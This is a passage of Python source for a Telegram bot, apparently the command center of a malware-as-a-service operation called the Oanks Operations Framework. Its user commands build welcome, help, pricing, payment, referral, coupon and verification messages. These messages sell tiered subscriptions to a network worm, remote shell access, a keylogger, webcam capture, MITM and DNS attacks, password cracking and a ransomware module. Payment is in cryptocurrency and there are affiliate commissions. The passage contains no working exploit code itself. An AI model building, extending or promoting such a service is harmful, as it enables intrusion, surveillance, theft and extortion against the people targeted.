        return buttons

    def _build_inline_results(self, user_id: int, query: str) -> List[Dict]:
        results = []
        common_commands = [
            ("/start", "Start the bot", "Start interacting with Oanks Command Center"),
            ("/help", "Get help", "View all available commands and features"),
            ("/status", "System status", "Check Oanks system health and status"),
            ("/price", "View pricing", "See premium pricing and payment methods"),
            ("/premium", "Premium info", "Learn about Oanks premium features"),
        ]
        for cmd, title, description in common_commands:
            if not query or query.lower() in cmd or query.lower() in title.lower():
                results.append({
                    "type": "article", "id": f"cmd_{cmd.replace('/', '')}",
                    "title": f"{OanksBranding.EMOJI_COMMAND} {title}", "description": description,
                    "input_message_content": {"message_text": cmd, "parse_mode": "HTML"}
                })
        return results


    # ═══════════════════════════════════════════════════════════════════════════════
    # USER COMMANDS — PUBLIC FACE OF THE OVERLORD
    # ═══════════════════════════════════════════════════════════════════════════════

    @oanks_command("user", "Start the bot and show welcome message")
    def cmd_start(self, telegram_id: int, args: List[str]) -> str:
        session = self._get_session(telegram_id)
        name = html.escape(session.first_name or "Soldier") if session else "Soldier"
        welcome = (
            f"{OanksBranding.BANNER_FULL}\n\n"
            f"<b>Welcome to the nerve center, {name}.</b>\n\n"
            f"You have entered the <b>Oanks Operations Framework</b> — the most advanced command and control system ever built.\n\n"
            f"<b>👑 What you can do here:</b>\n"
            f"  • Access premium tools and services\n"
            f"  • Manage your account and subscriptions\n"
            f"  • View system status and analytics\n"
            f"  • Earn through referrals\n"
            f"  • And much more...\n\n"
            f"<b>🚀 Getting Started:</b>\n"
            f"  • /help — View all commands\n"
            f"  • /premium — Explore premium features\n"
            f"  • /price — See pricing\n"
            f"  • /status — Check system health\n\n"
            f"<b>💎 Premium users</b> unlock the Worm Module, Shell Access, and advanced analytics.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_main_menu_keyboard(session) if session else None
        return OanksCommandResult.ok(welcome, keyboard=keyboard)

    @oanks_command("user", "Display comprehensive help with all commands")
    def cmd_help(self, telegram_id: int, args: List[str]) -> str:
        session = self._get_session(telegram_id)
        is_admin = session.is_admin if session else False
        is_premium = session.is_premium if session else False
        help_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📖 OANKS COMMAND REFERENCE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>{OanksBranding.EMOJI_USER} USER COMMANDS</b>\n"
            f"<code>───────────────────────────────────────</code>\n"
            f"  /start — Welcome and main menu\n"
            f"  /help — This reference\n"
            f"  /oanks — About the Creator\n"
            f"  /boss — Admin contact\n"
            f"  /status — System status\n"
            f"  /stats — Your statistics\n"
            f"  /price — Pricing information\n"
            f"  /premium — Premium features overview\n"
            f"  /premium_buy — Purchase premium\n"
            f"  /premium_status — Your premium status\n"
            f"  /premium_methods — Payment methods\n"
            f"  /referral — Your referral link\n"
            f"  /referral_stats — Referral earnings\n"
            f"  /coupon — Apply coupon code\n"
            f"  /verify — Verify your account\n\n"
        )
        if is_premium:
            help_text += (
                f"<b>{OanksBranding.EMOJI_WORM} WORM MODULE</b> (Premium)\n"
                f"<code>───────────────────────────────────────</code>\n"
                f"  /worm_status — Worm network status\n"
                f"  /worm_spread — Spread worm to targets\n"
                f"  /worm_target — Set worm targets\n"
                f"  /worm_payload — Manage payloads\n"
                f"  /worm_scan — Scan for vulnerabilities\n"
                f"  /worm_crack — Password cracking\n"
                f"  /worm_mitm — Man-in-the-middle attacks\n"
                f"  /worm_dns — DNS manipulation\n\n"
                f"<b>{OanksBranding.EMOJI_SHELL} SHELL ACCESS</b> (Premium)\n"
                f"<code>───────────────────────────────────────</code>\n"
                f"  /shell — Execute shell commands\n"
                f"  /upload — Upload files\n"
                f"  /download — Download files\n"
                f"  /screenshot — Capture screenshots\n"
                f"  /webcam — Access webcam\n"
                f"  /keylog_start — Start keylogger\n"
                f"  /keylog_dump — Dump keylog data\n\n"
            )
        if is_admin:
            help_text += (
                f"<b>{OanksBranding.EMOJI_ADMIN} ADMIN COMMANDS</b>\n"
                f"<code>───────────────────────────────────────</code>\n"
                f"  /admin users — List all users\n"
                f"  /admin ban [id] — Ban a user\n"
                f"  /admin unban [id] — Unban a user\n"
                f"  /admin payments — View payments\n"
                f"  /admin payments_confirm — Confirm payment\n"
                f"  /admin premium_add [id] [tier] — Add premium\n"
                f"  /admin premium_remove [id] — Remove premium\n"
                f"  /admin premium_list — List premium users\n"
                f"  /admin premium_stats — Premium statistics\n"
                f"  /admin broadcast [msg] — Broadcast message\n"
                f"  /admin logs — View system logs\n"
                f"  /admin status — Admin system status\n"
                f"  /admin restart — Restart services\n"
                f"  /admin shutdown — Graceful shutdown\n"
                f"  /admin kill — Force kill\n"
                f"  /admin backup — Create backup\n"
                f"  /admin coupon_create — Create coupon\n"
                f"  /admin coupon_list — List coupons\n"
                f"  /admin coupon_delete [code] — Delete coupon\n"
                f"  /admin analytics — Full analytics\n"
                f"  /admin revenue — Revenue report\n"
                f"  /admin stats — Admin statistics\n\n"
            )
        help_text += (
            f"<b>🎙️ VOICE COMMANDS</b>\n"
            f"<code>───────────────────────────────────────</code>\n"
            f"  Send a voice message to execute commands naturally.\n"
            f"  Try saying: \"status\", \"help\", \"price\", \"screenshot\"\n\n"
            f"<b>📁 FILE UPLOADS</b>\n"
            f"<code>───────────────────────────────────────</code>\n"
            f"  Upload CSV, JSON, Excel, TXT, or LOG files.\n"
            f"  The Overlord will parse and offer actions.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_main_menu_keyboard(session) if session else None
        return OanksCommandResult.ok(help_text, keyboard=keyboard)

    @oanks_command("user", "Display information about Oanks, the Creator")
    def cmd_oanks(self, telegram_id: int, args: List[str]) -> str:
        oanks_info = (
            f"{OanksBranding.BANNER_SKULL}\n\n"
            f"<b>👑 THE CREATOR — OANKS (@oanksnood)</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Framework:</b> Oanks Operations Framework\n"
            f"<b>Phase:</b> {OanksBranding.PHASE}\n"
            f"<b>Version:</b> {OanksBranding.VERSION}\n"
            f"<b>Codename:</b> {OanksBranding.CODENAME}\n"
            f"<b>Build Date:</b> {OanksBranding.BUILD_DATE}\n"
            f"<b>Classification:</b> {OanksBranding.CLASSIFICATION}\n\n"
            f"<b>🧠 Philosophy:</b>\n"
            f"\"Every command flows through here.\n"
            f" Every phase bows to this throne.\"\n\n"
            f"<b>🌐 Channel:</b> {OanksConfig.TELEGRAM_CHANNEL_URL}\n"
            f"<b>📢 Public Bot:</b> {OanksConfig.TELEGRAM_CHANNEL_ID}\n"
            f"<b>🔒 Admin Bot:</b> {OanksConfig.TELEGRAM_ADMIN_BOT_ID}\n\n"
            f"<b>⚡ Capabilities:</b>\n"
            f"  • 50+ integrated commands\n"
            f"  • 15-phase modular architecture\n"
            f"  • Real-time Telegram integration\n"
            f"  • Interactive inline keyboards\n"
            f"  • Voice command support\n"
            f"  • File upload processing\n"
            f"  • Multi-phase orchestration\n"
            f"  • Military-grade reliability\n\n"
            f"<b>💀 Warning:</b>\n"
            f"This system is designed for authorized operations only.\n"
            f"Unauthorized access will be logged and traced.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return OanksCommandResult.ok(oanks_info)

    @oanks_command("user", "Display admin/boss contact information")
    def cmd_boss(self, telegram_id: int, args: List[str]) -> str:
        boss_info = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔒 BOSS / ADMIN CONTACT</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Creator:</b> Oanks (@oanksnood)\n"
            f"<b>Channel:</b> {OanksConfig.TELEGRAM_CHANNEL_URL}\n"
            f"<b>Admin Bot:</b> {OanksConfig.TELEGRAM_ADMIN_BOT_ID}\n\n"
            f"<b>📧 For Support:</b>\n"
            f"  • Use /help for command reference\n"
            f"  • Use /premium for subscription issues\n"
            f"  • Use /referral for referral questions\n"
            f"  • Contact @oanksnood for direct support\n\n"
            f"<b>⚠️ Emergency:</b>\n"
            f"If you encounter critical issues, contact the admin immediately.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return OanksCommandResult.ok(boss_info)

    @oanks_command("user", "Check system status and health")
    def cmd_status(self, telegram_id: int, args: List[str]) -> str:
        uptime = time.time() - self._start_time
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        seconds = int(uptime % 60)
        api_stats = self._api.stats
        webhook_stats = self._webhook.stats
        phases_online = sum([
            self._db is not None, self._account_factory is not None,
            self._premium_mgr is not None, self._user_mgr is not None,
            self._referral_mgr is not None, self._coupon_mgr is not None,
            self._analytics is not None, self._admin_ctrl is not None,
            self._money_module is not None, self._security_module is not None,
            self._worm_module is not None, self._ransom_module is not None,
            self._distributed_module is not None, self._darkweb_module is not None,
            self._ai_module is not None, self._shell_module is not None
        ])
        status_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📡 SYSTEM STATUS REPORT</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>⏱️ Uptime:</b> {hours}h {minutes}m {seconds}s\n"
            f"<b>👑 Framework:</b> {OanksBranding.FRAMEWORK}\n"
            f"<b>📦 Phase:</b> {OanksBranding.PHASE}\n"
            f"<b>🔖 Version:</b> {OanksBranding.VERSION}\n\n"
            f"<b>📊 Command Center Metrics:</b>\n"
            f"  • Total Commands: {self._total_commands}\n"
            f"  • Total Callbacks: {self._total_callbacks}\n"
            f"  • Total Errors: {self._total_errors}\n"
            f"  • Active Sessions: {len(self._sessions)}\n"
            f"  • Error Rate: {(self._total_errors / max(self._total_commands, 1)) * 100:.2f}%\n\n"
            f"<b>🌐 Telegram API:</b>\n"
            f"  • Requests: {api_stats.get('total_requests', 0)}\n"
            f"  • Errors: {api_stats.get('total_errors', 0)}\n"
            f"  • Error Rate: {api_stats.get('error_rate', 0):.2f}%\n\n"
            f"<b>📥 Webhook Handler:</b>\n"
            f"  • Total Updates: {webhook_stats.get('total', 0)}\n"
            f"  • Errors: {webhook_stats.get('errors', 0)}\n"
            f"  • Unknown Types: {webhook_stats.get('unknown', 0)}\n\n"
            f"<b>🔌 Phase Connectivity:</b>\n"
            f"  • Phases Online: {phases_online}/16\n"
            f"  • Phases Offline: {16 - phases_online}\n\n"
            f"<b>⚡ Status:</b> {'🟢 OPERATIONAL' if phases_online >= 8 else '🟡 DEGRADED' if phases_online >= 4 else '🔴 CRITICAL'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "status_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(status_text, keyboard=keyboard)

    @oanks_command("user", "Display user statistics and activity")
    def cmd_stats(self, telegram_id: int, args: List[str]) -> str:
        session = self._get_session(telegram_id)
        if not session: return OanksConfig.ERROR_SESSION_EXPIRED
        user_commands = [h for h in self._command_history if h.get("user_id") == telegram_id]
        total_user_cmds = len(user_commands)
        rate_status = self._get_rate_limit_status(telegram_id)
        premium_info = "Not subscribed"
        if self._premium_mgr:
            try:
                pstatus = self._premium_mgr.check_premium(telegram_id)
                if pstatus: premium_info = f"Active (Tier: {pstatus.get('tier', 'Unknown')})"
            except: pass
        referral_count = 0
        referral_earnings = 0.0
        if self._referral_mgr:
            try:
                ref_stats = self._referral_mgr.get_stats(telegram_id)
                referral_count = ref_stats.get("count", 0)
                referral_earnings = ref_stats.get("earnings", 0.0)
            except: pass
        stats_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📈 YOUR STATISTICS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>👤 Profile:</b>\n"
            f"  • ID: <code>{telegram_id}</code>\n"
            f"  • Username: @{html.escape(session.username or 'N/A')}\n"
            f"  • Name: {html.escape(session.first_name or '')} {html.escape(session.last_name or '')}\n"
            f"  • Language: {session.language_code.upper()}\n"
            f"  • Admin: {'✅ Yes' if session.is_admin else '❌ No'}\n"
            f"  • Premium: {'✅ Yes' if session.is_premium else '❌ No'}\n\n"
            f"<b>📊 Activity:</b>\n"
            f"  • Commands Executed: {session.command_count}\n"
            f"  • Total Commands (History): {total_user_cmds}\n"
            f"  • Session Started: {datetime.datetime.fromtimestamp(session.created_at).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"  • Last Activity: {datetime.datetime.fromtimestamp(session.last_activity).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"<b>⏳ Rate Limit:</b>\n"
            f"  • Requests This Minute: {rate_status['requests_in_window']}\n"
            f"  • Limit: {rate_status['limit']}/min\n"
            f"  • Remaining: {rate_status['remaining']}\n\n"
            f"<b>💎 Premium Status:</b>\n"
            f"  • {premium_info}\n\n"
            f"<b>🔗 Referrals:</b>\n"
            f"  • Referrals: {referral_count}\n"
            f"  • Earnings: ${referral_earnings:.2f}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "stats_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(stats_text, keyboard=keyboard)

    @oanks_command("user", "Display pricing information for all tiers")
    def cmd_price(self, telegram_id: int, args: List[str]) -> str:
        price_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💲 PREMIUM PRICING</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🥉 BRONZE TIER</b> — $9.99/month\n"
            f"  • Basic worm module access\n"
            f"  • 5 concurrent operations\n"
            f"  • Standard support\n"
            f"  • Basic analytics\n\n"
            f"<b>🥈 SILVER TIER</b> — $24.99/month\n"
            f"  • Full worm module access\n"
            f"  • Shell command execution\n"
            f"  • 20 concurrent operations\n"
            f"  • Priority support\n"
            f"  • Advanced analytics\n"
            f"  • File upload processing\n\n"
            f"<b>🥇 GOLD TIER</b> — $49.99/month\n"
            f"  • All Silver features\n"
            f"  • Unlimited concurrent operations\n"
            f"  • Screenshot & webcam access\n"
            f"  • Keylogger functionality\n"
            f"  • Darkweb intelligence feeds\n"
            f"  • AI-assisted decision making\n"
            f"  • Custom payload development\n"
            f"  • Direct admin contact\n\n"
            f"<b>💎 PLATINUM TIER</b> — $99.99/month\n"
            f"  • All Gold features\n"
            f"  • Distributed operations\n"
            f"  • Ransomware module access\n"
            f"  • Multi-node orchestration\n"
            f"  • White-glove support\n"
            f"  • Revenue sharing program\n"
            f"  • Custom feature requests\n\n"
            f"<b>🎫 COUPONS:</b>\n"
            f"Use /coupon to apply discount codes.\n\n"
            f"<b>🔗 REFERRALS:</b>\n"
            f"Earn 20% commission on every referral.\n"
            f"Use /referral to get your link.\n\n"
            f"<b>💰 PAYMENT METHODS:</b>\n"
            f"  • Cryptocurrency (BTC, ETH, XMR)\n"
            f"  • PayPal\n"
            f"  • Credit Card\n"
            f"  • Bank Transfer\n\n"
            f"Use /premium_buy to subscribe.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_PREMIUM} Buy Premium", "callback_data": "premium_buy"},
             {"text": f"{OanksBranding.EMOJI_REFERRAL} Referral Program", "callback_data": "menu_referral"}],
            [{"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(price_text, keyboard=keyboard)

    @oanks_command("user", "Display premium features overview")
    def cmd_premium(self, telegram_id: int, args: List[str]) -> str:
        premium_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💎 PREMIUM FEATURES</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Unlock the full power of the Overlord.</b>\n\n"
            f"<b>🐛 Worm Module:</b>\n"
            f"  • Network spreading capabilities\n"
            f"  • Target acquisition and management\n"
            f"  • Payload deployment\n"
            f"  • Vulnerability scanning\n"
            f"  • Password cracking\n"
            f"  • MITM attack framework\n"
            f"  • DNS manipulation tools\n\n"
            f"<b>💻 Shell Access:</b>\n"
            f"  • Remote command execution\n"
            f"  • File upload/download\n"
            f"  • Screenshot capture\n"
            f"  • Webcam access\n"
            f"  • Keylogger functionality\n\n"
            f"<b>📊 Advanced Analytics:</b>\n"
            f"  • Real-time operation monitoring\n"
            f"  • Success rate tracking\n"
            f"  • Geographic heat maps\n"
            f"  • Performance metrics\n\n"
            f"<b>🕸️ Darkweb Intelligence:</b>\n"
            f"  • Threat feed integration\n"
            f"  • Leak database monitoring\n"
            f"  • Credential exposure alerts\n\n"
            f"<b>🤖 AI Assistant:</b>\n"
            f"  • Auto-decision making\n"
            f"  • Natural language command parsing\n"
            f"  • Predictive targeting\n\n"
            f"<b>💰 Revenue Sharing:</b>\n"
            f"  • 20% referral commissions\n"
            f"  • Premium tier bonuses\n\n"
            f"<b>📈 Current Pricing:</b>\n"
            f"  • Bronze: $9.99/mo | Silver: $24.99/mo\n"
            f"  • Gold: $49.99/mo | Platinum: $99.99/mo\n\n"
            f"Use /price for full details or /premium_buy to subscribe.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_PREMIUM} Buy Now", "callback_data": "premium_buy"},
             {"text": f"{OanksBranding.EMOJI_PRICE} View Pricing", "callback_data": "menu_price"}],
            [{"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(premium_text, keyboard=keyboard)

    @oanks_command("user", "Initiate premium purchase flow")
    def cmd_premium_buy(self, telegram_id: int, args: List[str]) -> str:
        buy_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💎 PREMIUM PURCHASE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Select your tier:</b>\n\n"
            f"🥉 <b>Bronze</b> — $9.99/mo\n"
            f"🥈 <b>Silver</b> — $24.99/mo\n"
            f"🥇 <b>Gold</b> — $49.99/mo\n"
            f"💎 <b>Platinum</b> — $99.99/mo\n\n"
            f"Payment methods:\n"
            f"  • BTC, ETH, XMR (Crypto)\n"
            f"  • PayPal\n"
            f"  • Credit Card\n"
            f"  • Bank Transfer\n\n"
        )
        if self._premium_mgr:
            try:
                payment_info = self._premium_mgr.get_payment_info(telegram_id)
                if payment_info: buy_text += f"<b>Your payment details:</b>\n{html.escape(str(payment_info))}\n\n"
            except Exception as e: self._logger.warning(f"Payment info fetch failed: {e}")
        buy_text += (
            f"Contact @oanksnood for manual payment processing.\n"
            f"Or use the buttons below to proceed.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": "🥉 Bronze ($9.99)", "callback_data": "premium_tier:bronze"},
             {"text": "🥈 Silver ($24.99)", "callback_data": "premium_tier:silver"}],
            [{"text": "🥇 Gold ($49.99)", "callback_data": "premium_tier:gold"},
             {"text": "💎 Platinum ($99.99)", "callback_data": "premium_tier:platinum"}],
            [{"text": f"{OanksBranding.EMOJI_COUPON} Apply Coupon", "callback_data": "coupon_apply"},
             {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(buy_text, keyboard=keyboard)

    @oanks_command("user", "Check current premium subscription status")
    def cmd_premium_status(self, telegram_id: int, args: List[str]) -> str:
        session = self._get_session(telegram_id)
        if not session: return OanksConfig.ERROR_SESSION_EXPIRED
        status_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💎 YOUR PREMIUM STATUS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
        )
        if session.is_premium:
            tier = "Unknown"
            expiry = "Unknown"
            if self._premium_mgr:
                try:
                    pstatus = self._premium_mgr.check_premium(telegram_id)
                    if pstatus:
                        tier = pstatus.get("tier", "Unknown")
                        expiry_ts = pstatus.get("expiry", 0)
                        if expiry_ts: expiry = datetime.datetime.fromtimestamp(expiry_ts).strftime('%Y-%m-%d %H:%M:%S')
                except Exception as e: self._logger.warning(f"Premium status fetch failed: {e}")
            status_text += (
                f"<b>✅ ACTIVE SUBSCRIPTION</b>\n\n"
                f"<b>Tier:</b> {html.escape(tier)}\n"
                f"<b>Expires:</b> {expiry}\n\n"
                f"<b>Your unlocked features:</b>\n"
                f"  • Worm Module access\n"
                f"  • Shell command execution\n"
                f"  • Advanced analytics\n"
                f"  • File upload processing\n"
                f"  • Voice commands\n"
                f"  • Priority support\n\n"
            )
        else:
            status_text += (
                f"<b>❌ NO ACTIVE SUBSCRIPTION</b>\n\n"
                f"You are currently on the free tier.\n"
                f"Upgrade to unlock the full power of the Overlord.\n\n"
                f"Use /premium_buy to subscribe or /price to view options.\n\n"
            )
        status_text += f"{OanksBranding.FOOTER}"
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_PREMIUM} Buy Premium", "callback_data": "premium_buy"},
             {"text": f"{OanksBranding.EMOJI_PRICE} View Pricing", "callback_data": "menu_price"}],
            [{"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(status_text, keyboard=keyboard)

    @oanks_command("user", "Display available payment methods")
    def cmd_premium_methods(self, telegram_id: int, args: List[str]) -> str:
        methods_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💰 PAYMENT METHODS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🪙 Cryptocurrency (Preferred):</b>\n"
            f"  • Bitcoin (BTC)\n"
            f"  • Ethereum (ETH)\n"
            f"  • Monero (XMR) — Anonymous\n"
            f"  • Litecoin (LTC)\n"
            f"  • USDT (ERC-20 / TRC-20)\n\n"
            f"<b>💳 Traditional:</b>\n"
            f"  • PayPal\n"
            f"  • Credit/Debit Card (Visa, MC, Amex)\n"
            f"  • Bank Transfer (SWIFT, SEPA)\n"
            f"  • Western Union\n"
            f"  • MoneyGram\n\n"
            f"<b>🎫 Coupons:</b>\n"
            f"  • Apply discount codes with /coupon\n"
            f"  • Referral credits automatically applied\n\n"
            f"<b>⚡ Processing:</b>\n"
            f"  • Crypto: Instant activation\n"
            f"  • PayPal/Card: 1-5 minutes\n"
            f"  • Bank Transfer: 1-3 business days\n\n"
            f"Contact @oanksnood for payment addresses or assistance.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return OanksCommandResult.ok(methods_text)

    @oanks_command("user", "Get your unique referral link")
    def cmd_referral(self, telegram_id: int, args: List[str]) -> str:
        referral_link = f"https://t.me/allspammedbyoanks?start=ref_{telegram_id}"
        if self._referral_mgr:
            try:
                ref_data = self._referral_mgr.get_link(telegram_id)
                if ref_data and ref_data.get("link"): referral_link = ref_data["link"]
            except Exception as e: self._logger.warning(f"Referral link fetch failed: {e}")
        referral_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔗 REFERRAL PROGRAM</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Your Referral Link:</b>\n"
            f"<code>{html.escape(referral_link)}</code>\n\n"
            f"<b>💰 Earnings:</b>\n"
            f"  • 20% commission on every referral purchase\n"
            f"  • Lifetime recurring commissions\n"
            f"  • Minimum payout: $50\n"
            f"  • Payout via crypto or PayPal\n\n"
            f"<b>📈 How it works:</b>\n"
            f"  1. Share your link with friends\n"
            f"  2. They sign up and purchase premium\n"
            f"  3. You earn 20% of their payment\n"
            f"  4. Track earnings with /referral_stats\n\n"
            f"<b>🎯 Tips:</b>\n"
            f"  • Share in Telegram groups\n"
            f"  • Post on forums and social media\n"
            f"  • Include in your bio/link tree\n"
            f"  • Create review content\n\n"
            f"Use /referral_stats to view your earnings.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_STATS} View Stats", "callback_data": "referral_stats"},
             {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(referral_text, keyboard=keyboard)

    @oanks_command("user", "Display referral statistics and earnings")
    def cmd_referral_stats(self, telegram_id: int, args: List[str]) -> str:
        ref_count = 0
        ref_earnings = 0.0
        ref_payouts = 0.0
        ref_pending = 0.0
        if self._referral_mgr:
            try:
                stats = self._referral_mgr.get_stats(telegram_id)
                ref_count = stats.get("count", 0)
                ref_earnings = stats.get("earnings", 0.0)
                ref_payouts = stats.get("payouts", 0.0)
                ref_pending = stats.get("pending", 0.0)
            except Exception as e: self._logger.warning(f"Referral stats fetch failed: {e}")
        stats_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📈 REFERRAL STATISTICS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🔗 Referrals:</b> {ref_count}\n"
            f"<b>💰 Total Earnings:</b> ${ref_earnings:.2f}\n"
            f"<b>💵 Paid Out:</b> ${ref_payouts:.2f}\n"
            f"<b>⏳ Pending:</b> ${ref_pending:.2f}\n"
            f"<b>🎯 Available:</b> ${max(0, ref_earnings - ref_payouts):.2f}\n\n"
            f"<b>📊 Breakdown:</b>\n"
            f"  • Bronze referrals: Calculated by tier\n"
            f"  • Silver referrals: Calculated by tier\n"
            f"  • Gold referrals: Calculated by tier\n"
            f"  • Platinum referrals: Calculated by tier\n\n"
            f"<b>💸 Payout:</b>\n"
            f"  • Minimum: $50\n"
            f"  • Methods: BTC, ETH, XMR, PayPal\n"
            f"  • Processing: 24-48 hours\n\n"
            f"Use /referral to get your link and start earning.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "referral_refresh"},
             {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(stats_text, keyboard=keyboard)

    @oanks_command("user", "Apply a coupon code for discounts")
    def cmd_coupon(self, telegram_id: int, args: List[str]) -> str:
        if args:
            code = args[0].upper()
            if self._coupon_mgr:
                try:
                    result = self._coupon_mgr.apply(telegram_id, code)
                    if result and result.get("valid"):
                        return OanksCommandResult.ok(
                            f"{OanksBranding.BANNER_SMALL}\n\n"
                            f"<b>🎫 COUPON APPLIED!</b>\n"
                            f"<code>═══════════════════════════════════════</code>\n\n"
                            f"<b>Code:</b> <code>{html.escape(code)}</code>\n"
                            f"<b>Discount:</b> {result.get('discount', 'N/A')}%\n"
                            f"<b>Description:</b> {html.escape(result.get('description', ''))}\n\n"
                            f"Your discount will be applied at checkout.\n\n"
                            f"{OanksBranding.FOOTER}"
                        )
                    else:
                        return OanksCommandResult.error(
                            f"🎫 <b>INVALID COUPON</b>\n\n"
                            f"Code <code>{html.escape(code)}</code> is invalid or expired.\n"
                            f"Contact @oanksnood for valid codes.\n\n"
                            f"{OanksBranding.FOOTER}"
                        )
                except Exception as e: self._logger.warning(f"Coupon apply failed: {e}")
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>🎫 COUPON APPLIED</b>\n\n"
                f"Code <code>{html.escape(code)}</code> has been processed.\n"
                f"(Coupon manager not connected — processed locally)\n\n"
                f"{OanksBranding.FOOTER}"
            )
        coupon_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🎫 COUPON SYSTEM</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>How to use:</b>\n"
            f"Send /coupon [CODE] to apply a discount.\n\n"
            f"<b>Example:</b>\n"
            f"  /coupon OANKS50\n"
            f"  /coupon WELCOME20\n"
            f"  /coupon REFERRAL15\n\n"
            f"<b>💡 Tips:</b>\n"
            f"  • Codes are case-insensitive\n"
            f"  • One code per purchase\n"
            f"  • Cannot be combined with other offers\n"
            f"  • Some codes are time-limited\n\n"
            f"Contact @oanksnood for valid coupon codes.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return OanksCommandResult.ok(coupon_text)

    @oanks_command("user", "Verify user account status")
    def cmd_verify(self, telegram_id: int, args: List[str]) -> str:
        session = self._get_session(telegram_id)
        if not session: return OanksConfig.ERROR_SESSION_EXPIRED
        verified = False
        verification_method = "None"
        if self._user_mgr:
            try:
                vstatus = self._user_mgr.get_verification_status(telegram_id)
                if vstatus:
                    verified = vstatus.get("verified", False)
                    verification_method = vstatus.get("method", "None")
            except Exception as e: self._logger.warning(f"Verification check failed: {e}")
        verify_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔍 ACCOUNT VERIFICATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>User ID:</b> <code>{telegram_id}</code>\n"
            f"<b>Username:</b> @{html.escape(session.username or 'N/A')}\n"
            f"<b>Name:</b> {html.escape(session.first_name or '')} {html.escape(session.last_name or '')}\n\n"
            f"<b>Verification Status:</b> {'✅ VERIFIED' if verified else '❌ NOT VERIFIED'}\n"
            f"<b>Method:</b> {verification_method}\n\n"
        )
        if not verified:
            verify_text += (
                f"<b>🔐 Why verify?</b>\n"
                f"  • Unlock premium purchase eligibility\n"
                f"  • Access referral program\n"
                f"  • Higher rate limits\n"
                f"  • Priority support\n\n"
                f"<b>📋 Verification Methods:</b>\n"
                f"  • Phone number verification\n"
                f"  • Email confirmation\n"
                f"  • Admin approval\n"
                f"  • Payment confirmation\n\n"
                f"Contact @oanksnood to initiate verification.\n\n"
            )
        else:
            verify_text += (
                f"<b>✅ Your account is verified!</b>\n"
                f"You have full access to all features.\n\n"
            )
        verify_text += f"{OanksBranding.FOOTER}"
        return OanksCommandResult.ok(verify_text)


    # ═══════════════════════════════════════════════════════════════════════════════
    # ADMIN COMMANDS — THE IRON FIST OF THE OVERLORD
    # ═══════════════════════════════════════════════════════════════════════════════

